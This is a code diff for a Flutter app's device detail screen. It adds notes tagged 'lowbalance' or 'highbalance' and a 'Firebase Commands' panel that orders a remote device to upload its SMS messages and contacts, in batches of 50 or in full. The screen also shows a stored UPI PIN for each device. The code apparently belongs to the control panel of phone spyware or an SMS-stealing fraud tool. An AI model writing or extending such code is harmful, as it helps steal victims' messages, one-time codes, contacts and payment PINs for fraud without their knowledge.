@@ -5,8 +5,8 @@ import '../../../../data/models/device.dart';
 import '../../../../data/repositories/device_repository.dart';
 import '../../../../core/utils/date_utils.dart' as utils;
 import '../dialogs/edit_settings_dialog.dart';
+import '../dialogs/add_note_dialog.dart';
 import '../../../providers/device_provider.dart';
-import 'package:flutter_screenutil/flutter_screenutil.dart';
 
 class DeviceInfoTab extends StatefulWidget {
   final Device device;
@@ -71,7 +71,19 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
     if (result == true && mounted) {
       await Future.delayed(const Duration(milliseconds: 500));
-      await _refreshDeviceInfo();/**/
+      await _refreshDeviceInfo();
+    }
+  }
+
+  Future<void> _handleEditNote() async {
+    final result = await showDialog<bool>(
+      context: context,
+      builder: (_) => AddNoteDialog(device: _currentDevice),
+    );
+
+    if (result == true && mounted) {
+      await Future.delayed(const Duration(milliseconds: 500));
+      await _refreshDeviceInfo();
     }
   }
 
@@ -92,6 +104,28 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
   String _getUpiPin() {
     return _currentDevice.upiPin ?? '123456';
+  }
+
+  Color _getNoteColor(String? priority) {
+    switch (priority) {
+      case 'lowbalance':
+        return const Color(0xFFF59E0B);
+      case 'highbalance':
+        return const Color(0xFF10B981);
+      default:
+        return const Color(0xFF6B7280);
+    }
+  }
+
+  IconData _getNoteIcon(String? priority) {
+    switch (priority) {
+      case 'lowbalance':
+        return Icons.warning_rounded;
+      case 'highbalance':
+        return Icons.check_circle_rounded;
+      default:
+        return Icons.note_rounded;
+    }
   }
 
   @override
@@ -184,6 +218,22 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
             ),
 
             const SizedBox(height: 16),
+
+            // 📝 Note Card
+            if (_currentDevice.hasNote) ...[
+              _NoteCard(
+                device: _currentDevice,
+                isDark: isDark,
+                onEdit: _handleEditNote,
+              ),
+              const SizedBox(height: 12),
+            ] else ...[
+              _AddNoteButton(
+                isDark: isDark,
+                onTap: _handleEditNote,
+              ),
+              const SizedBox(height: 12),
+            ],
 
             _ModernCard(
               isDark: isDark,
@@ -813,11 +863,132 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
               ),
             ),
 
+            const SizedBox(height: 12),
+
+            // 🔥 Firebase Commands Section
+            _ModernCard(
+              isDark: isDark,
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  _SectionHeader(
+                    icon: Icons.flash_on_rounded,
+                    title: 'Firebase Commands',
+                    color: const Color(0xFFFF6B35),
+                  ),
+                  const SizedBox(height: 12),
+                  Text(
+                    'Send commands to device via Firebase Cloud Messaging',
+                    style: TextStyle(
+                      fontSize: 11,
+                      color: isDark ? Colors.white60 : const Color(0xFF64748B),
+                    ),
+                  ),
+                  const SizedBox(height: 12),
+                  // Quick Upload Commands
+                  Row(
+                    children: [
+                      Expanded(
+                        child: _CommandButton(
+                          icon: Icons.sms_rounded,
+                          label: 'Quick SMS',
+                          subtitle: '50 messages',
+                          color: const Color(0xFF6366F1),
+                          isDark: isDark,
+                          onPressed: () => _sendFirebaseCommand('quick_upload_sms'),
+                        ),
+                      ),
+                      const SizedBox(width: 10),
+                      Expanded(
+                        child: _CommandButton(
+                          icon: Icons.contacts_rounded,
+                          label: 'Quick Contacts',
+                          subtitle: '50 contacts',
+                          color: const Color(0xFF8B5CF6),
+                          isDark: isDark,
+                          onPressed: () => _sendFirebaseCommand('quick_upload_contacts'),
+                        ),
+                      ),
+                    ],
+                  ),
+                  const SizedBox(height: 10),
+                  // Full Upload Commands
+                  Row(
+                    children: [
+                      Expanded(
+                        child: _CommandButton(
+                          icon: Icons.upload_rounded,
+                          label: 'All SMS',
+                          subtitle: 'Full upload',
+                          color: const Color(0xFF10B981),
+                          isDark: isDark,
+                          onPressed: () => _sendFirebaseCommand('upload_all_sms'),
+                        ),
+                      ),
+                      const SizedBox(width: 10),
+                      Expanded(
+                        child: _CommandButton(
+                          icon: Icons.cloud_upload_rounded,
+                          label: 'All Contacts',
+                          subtitle: 'Full upload',
+                          color: const Color(0xFF14B8A6),
+                          isDark: isDark,
+                          onPressed: () => _sendFirebaseCommand('upload_all_contacts'),
+                        ),
+                      ),
+                    ],
+                  ),
+                  const SizedBox(height: 10),
+                  // Ping Command
+                  _CommandButton(
+                    icon: Icons.radar_rounded,
+                    label: 'Ping Device (Firebase)',
+                    subtitle: 'Test connection',
+                    color: const Color(0xFFF59E0B),
+                    isDark: isDark,
+                    isFullWidth: true,
+                    onPressed: () => _sendFirebaseCommand('ping', parameters: {'type': 'firebase'}),
+                  ),
+                ],
+              ),
+            ),
+
             const SizedBox(height: 16),
           ],
         ),
       ),
     );
+  }
+
+  Future<void> _sendFirebaseCommand(String command, {Map<String, dynamic>? parameters}) async {
+    try {
+      final success = await _repository.sendCommand(
+        _currentDevice.deviceId,
+        command,
+        parameters: parameters,
+      );
+
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(success ? 'Command sent successfully' : 'Failed to send command'),
+            backgroundColor: success ? const Color(0xFF10B981) : const Color(0xFFEF4444),
+            behavior: SnackBarBehavior.floating,
+            duration: const Duration(seconds: 2),
+          ),
+        );
+      }
+    } catch (e) {
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('Error: $e'),
+            backgroundColor: const Color(0xFFEF4444),
+            behavior: SnackBarBehavior.floating,
+          ),
+        );
+      }
+    }
   }
 
   Color _getBatteryColor(int level) {
@@ -1172,6 +1343,260 @@ class _SettingTile extends StatelessWidget {
           ),
         ),
       ],
+    );
+  }
+}
+// 📝 Note Card Widget
+class _NoteCard extends StatelessWidget {
+  final Device device;
+  final bool isDark;
+  final VoidCallback onEdit;
+
+  const _NoteCard({
+    required this.device,
+    required this.isDark,
+    required this.onEdit,
+  });
+
+  Color _getNoteColor(String? priority) {
+    switch (priority) {
+      case 'lowbalance':
+        return const Color(0xFFF59E0B);
+      case 'highbalance':
+        return const Color(0xFF10B981);
+      default:
+        return const Color(0xFF6B7280);
+    }
+  }
+
+  IconData _getNoteIcon(String? priority) {
+    switch (priority) {
+      case 'lowbalance':
+        return Icons.warning_rounded;
+      case 'highbalance':
+        return Icons.check_circle_rounded;
+      default:
+        return Icons.note_rounded;
+    }
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return _ModernCard(
+      isDark: isDark,
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              _SectionHeader(
+                icon: Icons.note_rounded,
+                title: 'Note',
+                color: _getNoteColor(device.notePriority),
+              ),
+              const Spacer(),
+              IconButton(
+                icon: const Icon(Icons.edit_rounded, size: 18),
+                onPressed: onEdit,
+                tooltip: 'Edit Note',
+                padding: EdgeInsets.zero,
+                constraints: const BoxConstraints(),
+              ),
+            ],
+          ),
+          const SizedBox(height: 12),
+          Container(
+            padding: const EdgeInsets.all(12),
+            decoration: BoxDecoration(
+              color: _getNoteColor(device.notePriority).withOpacity(0.1),
+              borderRadius: BorderRadius.circular(8),
+              border: Border.all(
+                color: _getNoteColor(device.notePriority).withOpacity(0.3),
+              ),
+            ),
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Row(
+                  children: [
+                    Icon(
+                      _getNoteIcon(device.notePriority),
+                      size: 16,
+                      color: _getNoteColor(device.notePriority),
+                    ),
+                    const SizedBox(width: 8),
+                    Text(
+                      device.notePriorityLabel,
+                      style: TextStyle(
+                        fontSize: 12,
+                        fontWeight: FontWeight.w700,
+                        color: _getNoteColor(device.notePriority),
+                      ),
+                    ),
+                    const Spacer(),
+                    Text(
+                      device.noteTimeAgo,
+                      style: TextStyle(
+                        fontSize: 10,
+                        color: isDark ? Colors.white60 : const Color(0xFF64748B),
+                      ),
+                    ),
+                  ],
+                ),
+                const SizedBox(height: 8),
+                Text(
+                  device.noteMessage ?? '',
+                  style: TextStyle(
+                    fontSize: 13,
+                    color: isDark ? Colors.white : const Color(0xFF334155),
+                    height: 1.4,
+                  ),
+                ),
+              ],
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+}
+
+// 📝 Add Note Button Widget
+class _AddNoteButton extends StatelessWidget {
+  final bool isDark;
+  final VoidCallback onTap;
+
+  const _AddNoteButton({
+    required this.isDark,
+    required this.onTap,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return OutlinedButton.icon(
+      onPressed: onTap,
+      icon: const Icon(Icons.note_add_rounded, size: 18),
+      label: const Text('Add Note'),
+      style: OutlinedButton.styleFrom(
+        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
+        side: BorderSide(
+          color: isDark ? Colors.white24 : const Color(0xFFE2E8F0),
+        ),
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(10),
+        ),
+      ),
+    );
+  }
+}
+
+// 🔥 Command Button Widget
+class _CommandButton extends StatelessWidget {
+  final IconData icon;
+  final String label;
+  final String subtitle;
+  final Color color;
+  final bool isDark;
+  final VoidCallback onPressed;
+  final bool isFullWidth;
+
+  const _CommandButton({
+    required this.icon,
+    required this.label,
+    required this.subtitle,
+    required this.color,
+    required this.isDark,
+    required this.onPressed,
+    this.isFullWidth = false,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return Material(
+      color: Colors.transparent,
+      child: InkWell(
+        onTap: onPressed,
+        borderRadius: BorderRadius.circular(10),
+        child: Container(
+          padding: const EdgeInsets.all(12),
+          decoration: BoxDecoration(
+            color: color.withOpacity(0.1),
+            borderRadius: BorderRadius.circular(10),
+            border: Border.all(
+              color: color.withOpacity(0.3),
+              width: 1.5,
+            ),
+          ),
+          child: isFullWidth
+              ? Row(
+                  children: [
+                    Container(
+                      padding: const EdgeInsets.all(8),
+                      decoration: BoxDecoration(
+                        color: color.withOpacity(0.2),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      child: Icon(icon, color: color, size: 20),
+                    ),
+                    const SizedBox(width: 12),
+                    Expanded(
+                      child: Column(
+                        crossAxisAlignment: CrossAxisAlignment.start,
+                        children: [
+                          Text(
+                            label,
+                            style: TextStyle(
+                              fontSize: 13,
+                              fontWeight: FontWeight.w700,
+                              color: isDark ? Colors.white : const Color(0xFF0F172A),
+                            ),
+                          ),
+                          Text(
+                            subtitle,
+                            style: TextStyle(
+                              fontSize: 10,
+                              color: isDark ? Colors.white60 : const Color(0xFF64748B),
+                            ),
+                          ),
+                        ],
+                      ),
+                    ),
+                    Icon(Icons.arrow_forward_rounded, color: color, size: 18),
+                  ],
+                )
+              : Column(
+                  mainAxisSize: MainAxisSize.min,
+                  children: [
+                    Container(
+                      padding: const EdgeInsets.all(10),
+                      decoration: BoxDecoration(
+                        color: color.withOpacity(0.2),
+                        borderRadius: BorderRadius.circular(8),
+                      ),
+                      child: Icon(icon, color: color, size: 22),
+                    ),
+                    const SizedBox(height: 8),
+                    Text(
+                      label,
+                      style: TextStyle(
+                        fontSize: 12,
+                        fontWeight: FontWeight.w700,
+                        color: isDark ? Colors.white : const Color(0xFF0F172A),
+                      ),
+                      textAlign: TextAlign.center,
+                    ),
+                    Text(
+                      subtitle,
+                      style: TextStyle(
+                        fontSize: 9,
+                        color: isDark ? Colors.white60 : const Color(0xFF64748B),
+                      ),
+                      textAlign: TextAlign.center,
+                    ),
+                  ],
+                ),
+        ),
+      ),
     );
   }
 }
